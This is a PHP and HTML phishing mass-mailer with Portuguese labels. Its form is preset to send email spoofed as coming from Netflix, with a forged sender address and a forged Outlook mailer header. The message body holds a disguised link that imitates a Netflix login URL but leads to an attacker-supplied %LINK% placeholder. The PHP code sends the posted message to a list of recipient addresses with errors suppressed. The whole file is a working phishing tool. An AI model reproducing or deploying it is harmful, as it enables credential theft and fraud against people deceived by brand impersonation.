<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
	<meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="viewport" content="user-scalable=no" />
    <title>enviando</title>
	<!-- Stylesheets -->
 
	 
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
	
	<!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
</head>
<body>
	<div id="maincontainer">
	  <div id="mainformbox">
		  <div id="mainform">
			  <p>Nonme</p>
			  <form method="post" action="">
				  <p style="font-family: monospace;">
				    <textarea  id="JoomFucker"  name="JoomFucker" cols="20" rows="5">big-e-boyola@bol.com.br</textarea>
				    <input name="de" type="text" id="de" value="netflix" size="30">
					  <input name="from" type="text" id="from" value="provedor@provedor.com.br" size="30">
					  <input name="assunto" type="text" id="assunto" value="testando" size="30">
					<textarea id="message" name="message" cols="20" rows="5">
					
					
					<a href="%LINK%?https://www.netflix.com/cliente/login.asp=039283" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en-GB&amp;q=%LINK%?https://www.netflix.com/cliente/login.asp=039283&amp;source=gmail&amp;ust=1469172403783000&amp;usg=AFQjCNH-MlbDsXYqI6FIoI6ntAxamRi7lg"><wbr><img src="http://www.bt-wetzlar.de/templates/atomic/folader.png" width="1189" height="531"></a>
					
					
					</textarea> 
					  <input class="button blue" type="submit" value=" enviar " name="gofucker" id="gofucker">
			  </form>
				
	    </div>
		  <div class="formtab" id="formtab"></div>
	  </div>
		<h5 id="feedback"></h5>
		<div id="status"></div>
		<div class="clear"><br></div>
	</div>
	<br>
	<div id="box">
		<span class="bold" id="boxtitle"></span>
		<span id="boxheader"></span>
		<span id="boxcontent"></span>
		<!-- JavaScript -->
        	   
	   
        <script src="js/core.js"></script>
	    <script>
	$(document).ready(function(){
		
	});	
	    </script>	
</div>
</body>
</html>
 
<?php 
set_time_limit(0); 
error_reporting(0);

if($_POST["JoomFucker"]!=""){ 
$sites = $_POST["JoomFucker"];
$message = $_POST['message'];	
$assunto = $_POST['assunto'];	
$nome = $_POST['nome'];	
$de = $_POST['de'];		
$message = stripslashes($message);	
 $message = ereg_replace("%EMAIL%", $sites, $message);		
 $headers = "From: $de <$from>\r\nReply-To: $replyto\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";		
$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";		
$subject2 = "".$assunto."";		
mail($sites, $subject2, $message, $headers);		

		
echo ($sites." - Enviado");       		
}  
?>
				 